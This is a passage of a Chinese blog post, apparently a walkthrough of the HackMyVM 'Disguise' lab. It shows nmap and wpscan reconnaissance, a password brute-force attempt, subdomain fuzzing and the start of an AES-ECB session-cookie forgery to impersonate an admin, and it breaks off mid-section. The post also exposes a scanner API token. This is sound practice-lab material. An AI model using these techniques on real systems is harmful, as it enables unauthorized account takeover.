<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Disguise.

 https://hackmyvm.eu/machines/machine.php?vm=Disguise
 

Notes：A machine that simulates a real environment, please be careful and have fun.

前期踩点







Web 渗透

WordPess

看到 `nmap` 版本探测中扫描出..." data-next-head=""/><meta property="og:title" content="HackMyVM - Disguise" data-next-head=""/><meta property="og:description" content="Disguise.

 https://hackmyvm.eu/machines/machine.php?vm=Disguise
 

Notes：A machine that simulates a real environment, please be careful and have fun.

前期踩点







Web 渗透

WordPess

看到 `nmap` 版本探测中扫描出..." data-next-head=""/><meta property="og:url" content="https://sunsetaction.top/2025/05/13/HackMyVMDisguise" data-next-head=""/><meta property="og:type" content="article" data-next-head=""/><meta property="article:modified_time" content="2025-05-13" data-next-head=""/><meta property="article:section" content="靶机" data-next-head=""/><meta property="article:tag" content="HackMyVM" data-next-head=""/><meta property="article:tag" content="Linux靶机" data-next-head=""/><meta property="article:tag" content="Crypto" data-next-head=""/><meta property="article:tag" content="AES" data-next-head=""/><meta property="article:tag" content="Brute" data-next-head=""/><meta property="article:tag" content="Mysql" data-next-head=""/><meta property="article:tag" content="Hidden" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="HackMyVM - Disguise" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top/2025/05/13/HackMyVMDisguise" data-next-head=""/><title data-next-head="">HackMyVM - Disguise | Sunset Blog</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="https://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="https://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/1313794ff57095ab.css" as="style"/><link rel="stylesheet" href="/_next/static/css/1313794ff57095ab.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-0d12d6e4400a07d7.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-603a6856ad27351b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/951-ad0cb56524ddaaf1.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-cddf2e5d395d3115.js" defer=""></script><script src="/_next/static/Fp5Bh2sJwXWhfuP5BHETu/_buildManifest.js" defer=""></script><script src="/_next/static/Fp5Bh2sJwXWhfuP5BHETu/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3/4 lg:w-2/3 xl:w-4xl px-3 mt-5 md:mt-15 max-w-[800px]"><h1 class="text-xl md:text-2xl font-bold text-red-700 dark:text-red-400">HackMyVM - Disguise</h1><div class="flex flex-col"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">SUNSET</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">2025-05-13</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">(Updated:<!-- -->2025-05-13<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Tags:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">HackMyVM</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Linux靶机</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Crypto</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">AES</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Brute</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Mysql</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Hidden</span></div></div><div class="my-8 text-center">加载中...</div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackMyVMDisguise","contentHtml":"\u003ch1\u003eDisguise.\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://hackmyvm.eu/machines/machine.php?vm=Disguise\"\u003ehttps://hackmyvm.eu/machines/machine.php?vm=Disguise\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eNotes：\u003cstrong\u003eA machine that simulates a real environment, please be careful and have fun.\u003c/strong\u003e\u003c/p\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Disguise nmap -sP 192.168.56.0/24                      \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-12 02:37 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.1\nHost is up (0.00050s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.2\nHost is up (0.00046s latency).\nMAC Address: 08:00:27:BD:06:66 (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.59\nHost is up (0.00078s latency).\nMAC Address: 08:00:27:34:29:FC (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.4\nHost is up.\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 256 IP addresses (4 hosts up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 2.01 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Disguise nmap -sT -min-rate 10000 -p- 192.168.56.59    \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-12 02:37 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.59\nHost is up (0.0010s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:34:29:FC (Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 4.38 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Disguise nmap -sT -A -T4 -O -p 22,80 192.168.56.59 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-12 02:45 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.59\nHost is up (0.00082s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)\n| ssh-hostkey: \n|   2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)\n|   256 1e:a7:44:0b:2c:1b:0d:77:83:\u003cspan class=\"hljs-built_in\"\u003edf\u003c/span\u003e:1d:9f:0e:30:08:4d (ECDSA)\n|_  256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)\n80/tcp open  http    Apache httpd 2.4.59 ((Debian))\n|_http-generator: WordPress 6.7.2\n|_http-server-header: Apache/2.4.59 (Debian)\n|_http-title: Just a simple wordpress site\n| http-robots.txt: 1 disallowed entry \n|_/wp-admin/\nMAC Address: 08:00:27:34:29:FC (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.82 ms 192.168.56.59\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 12.08 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eWeb 渗透\u003c/h2\u003e\n\u003ch3\u003eWordPess\u003c/h3\u003e\n\u003cp\u003e看到 \u003ccode\u003enmap\u003c/code\u003e 版本探测中扫描出来了 \u003ccode\u003eWordPress\u003c/code\u003e ，那么就可以使用 \u003ccode\u003ewpscan\u003c/code\u003e 来针对性扫描了\u003c/p\u003e\n\u003cp\u003e访问 Web 页面，提示 \u003ccode\u003eDisguise.hmv\u003c/code\u003e 添加到 \u003ccode\u003ehosts\u003c/code\u003e 中\u003c/p\u003e\n\u003cp\u003e在页面信息中能得到一个用户 \u003ccode\u003esimpleAdmin\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e使用 \u003ccode\u003ewpscan\u003c/code\u003e 进行针对性扫描了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Disguise wpscan --url disguise.hmv --api-token bOauzGNYvhy6BU3DlHGCMVZmWJDqZH5tuFoHfsdk91o -e u,ap --plugins-detection mixed\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` |  _ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.27\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://disguise.hmv/ [192.168.56.59]\n[+] Started: Mon May 12 03:25:17 2025\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.59 (Debian)\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] robots.txt found: http://disguise.hmv/robots.txt\n | Interesting Entries:\n |  - /wp-admin/\n |  - /wp-admin/admin-ajax.php\n | Found By: Robots Txt (Aggressive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://disguise.hmv/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://disguise.hmv/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] Upload directory has listing enabled: http://disguise.hmv/wp-content/uploads/\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://disguise.hmv/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 6.7.2 identified (Outdated, released on 2025-02-11).\n | Found By: Rss Generator (Passive Detection)\n |  - http://disguise.hmv/feed/, \u0026#x3C;generator\u003ehttps://wordpress.org/?v=6.7.2\u0026#x3C;/generator\u003e\n |  - http://disguise.hmv/comments/feed/, \u0026#x3C;generator\u003ehttps://wordpress.org/?v=6.7.2\u0026#x3C;/generator\u003e\n\n[+] WordPress theme \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e use: newscrunch\n | Location: http://disguise.hmv/wp-content/themes/newscrunch/\n | Last Updated: 2025-05-07T00:00:00.000Z\n | Readme: http://disguise.hmv/wp-content/themes/newscrunch/readme.txt\n | [!] The version is out of \u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e, the latest version is 1.8.5\n | Style URL: http://disguise.hmv/wp-content/themes/newscrunch/style.css?ver=6.7.2\n | Style Name: Newscrunch\n | Style URI: https://spicethemes.com/newscrunch\n | Description: Newscrunch is a magazine and blog theme. It is a lightweight, elegant, and fully responsive theme sp...\n | Author: spicethemes\n | Author URI: https://spicethemes.com\n |\n | Found By: Css Style In Homepage (Passive Detection)\n | Confirmed By: Css Style In 404 Page (Passive Detection)\n |\n | Version: 1.8.4.2 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://disguise.hmv/wp-content/themes/newscrunch/style.css?ver=6.7.2, Match: Version: 1.8.4.2\u003cspan class=\"hljs-string\"\u003e'\n\n[+] Enumerating All Plugins (via Passive and Aggressive Methods)\n Checking Known Locations - Time: 00:43:31 \u0026#x3C;==================\u003e (110475 / 110475) 100.00% Time: 00:43:31[+] Checking Plugin Versions (via Passive and Aggressive Methods)                   \u003e (44160 / 110475) 39.97%  ETA: 00:24:36\n[i] Plugin(s) Identified:\n\n[+] akismet\n | Location: http://disguise.hmv/wp-content/plugins/akismet/\n | Latest Version: 5.4\n | Last Updated: 2025-05-07T16:30:00.000Z\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://disguise.hmv/wp-content/plugins/akismet/, status: 403\n |\n | [!] 1 vulnerability identified:\n |\n | [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)\n |     Fixed in: 3.1.5\n |     References:\n |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357\n |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/\n |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html\n |\n\n....\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以看到 \u003ccode\u003eWordPress\u003c/code\u003e 版本还是比较新的，而且插件也没有扫描出来漏洞\u003c/p\u003e\n\u003cp\u003e再对上面的到的用户名进行爆破，密码使用 \u003ccode\u003erockyou\u003c/code\u003e 到 \u003ccode\u003e5000\u003c/code\u003e 我就停了，也，没爆破出来\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e模糊测试\u003c/h3\u003e\n\u003cp\u003e再扫描一下子域名\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Disguise wfuzz -c -w ../../Dict/SecLists-2024.3/Discovery/DNS/subdomains-top1million-110000.txt -u http://disguise.hmv -H \u003cspan class=\"hljs-string\"\u003e'host:FUZZ.disguise.hmv'\u003c/span\u003e --hl=890\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://disguise.hmv/\nTotal requests: 114441\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                   \n=====================================================================\n\n000000001:   301        0 L      0 W        0 Ch        \u003cspan class=\"hljs-string\"\u003e\"www\"\u003c/span\u003e                                               \n000005051:   200        18 L     52 W       846 Ch      \u003cspan class=\"hljs-string\"\u003e\"dark\"\u003c/span\u003e                              \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到新的子域名 \u003ccode\u003edark\u003c/code\u003e 添加到 \u003ccode\u003ehosts\u003c/code\u003e ，再访问\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以进行注注册，注册用户 \u003ccode\u003ehelp\u003c/code\u003e 然后登陆进去\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e伪造 Session\u003c/h3\u003e\n\u003cp\u003e这部分看着WP和自己理解做的（实在不懂密码学）\u003c/p\u003e\n\u003cp\u003e被动拦截的包中有一个特别的字段 \u003ccode\u003edark_session\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e将其进行 URL 解码后是一串 \u003ccode\u003ebase64\u003c/code\u003e ，再继续解码出来感觉怪怪的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e多注册几个用户查看是否存在构造的可能（注册时用户名超过\u003ccode\u003e8\u003c/code\u003e个会被阻止，但是它是前端验证，绕过即可）同时发现 \u003ccode\u003esimpleAdmin\u003c/code\u003e 被注册了，可能就是要伪造它。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// a bxgIMpx0LFnwYPwx7tl37A== 1\n// aaaa e3Opvt7372tUQCmdavBBxA== 4\n// aaaaaaaa 5SKl5Bbstz3e0GrQ8QBCkA== 8\n// aaaaaaaaaa Hxs4O2FVu/QM9EqHsnvrOA== 10\n// aaaaaaaaaaaa FUoxH12UY/N58pkbRNAAf8JwkfrsOdSxW16pbszGJLY= 12\n// aaaaaaaaaaaaaaaaaaaaaaaa FUoxH12UY/N58pkbRNAAf7p+nJP55MNIxlkje3zIK2M= 24\n// aaaaaaaaaaaaaaaaaaaaaaaaaaaa FUoxH12UY%2FN58pkbRNAAf0Kfd1bvz3G39ZMOl2HnjTHCcJH67DnUsVteqW7MxiS2 28\n// aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa FUoxH12UY/N58pkbRNAAf0Kfd1bvz3G39ZMOl2HnjTEN1ZCFIDLOwYyKBoSxyL6x 32\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以注意到在 \u003ccode\u003e12\u003c/code\u003e 位后用户名生成的 \u003ccode\u003eSession\u003c/code\u003e 前半部分是一样的，我们把它拿去喂给 \u003ccode\u003eGPT\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e推断出来是 \u003ccode\u003eAES\u003c/code\u003e 加密，采用 \u003ccode\u003ePKCS#7\u003c/code\u003e 填充：\u003ca href=\"https://segmentfault.com/a/1190000019793040\"\u003ehttps://segmentfault.com/a/1190000019793040\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e并且看加密后的值比较的话，应该是\u003ccode\u003eAES-128\u003c/code\u003e （通过群友得知加密算法是\u003ccode\u003eAES-128-ecb\u003c/code\u003e）\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003eAES-128-ECB\u003c/code\u003e（Electronic Codebook）是AES对称加密算法的一种基础工作模式。其核心特点是将明文分成固定大小的块（128位/16字节），每个块\u003cstrong\u003e独立加密\u003c/strong\u003e，加密过程无需依赖其他数据块\n\u003cstrong\u003e密钥长度\u003c/strong\u003e：固定为128位（16字节），如密钥不足会通过补零或截断处理\n\u003cstrong\u003e填充规则\u003c/strong\u003e：若明文长度不足16字节的整数倍，需填充至对齐。常用 PKCS#7 填充（例如，缺5字节则填充5个\u003ccode\u003e0x05\u003c/code\u003e）\n\u003cstrong\u003e加密流程\u003c/strong\u003e：每16字节明文块直接通过AES算法加密，生成16字节密文块，最终拼接为完整密文\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e那么一个加密块是\u003ccode\u003e16\u003c/code\u003e字节，\u003ccode\u003esimpleAdmin\u003c/code\u003e是\u003ccode\u003e11\u003c/code\u003e字节，后边就要补充\u003ccode\u003e4\u003c/code\u003e个\u003ccode\u003e0x04\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eaaaaaaaaaaaa\\x04\\x04\\x04\\x04\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是我们可以注意到我们输入了 \u003ccode\u003e12\u003c/code\u003e个字节和\u003ccode\u003e28\u003c/code\u003e个字节时 ，密文就翻倍了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// aaaaaaaa 5SKl5Bbstz3e0GrQ8QBCkA== 8\n// aaaaaaaaaaaa FUoxH12UY/N58pkbRNAAf8JwkfrsOdSxW16pbszGJLY= 12\n// aaaaaaaaaaaaaaaaaaaaaaaaaaaa FUoxH12UY%2FN58pkbRNAAf0Kfd1bvz3G39ZMOl2HnjTHCcJH67DnUsVteqW7MxiS2 28\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e那么一个块是16字节，为什么12就翻倍了呢？\u003c/p\u003e\n\u003cp\u003e那么就是可能加了\u003ccode\u003esalt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs 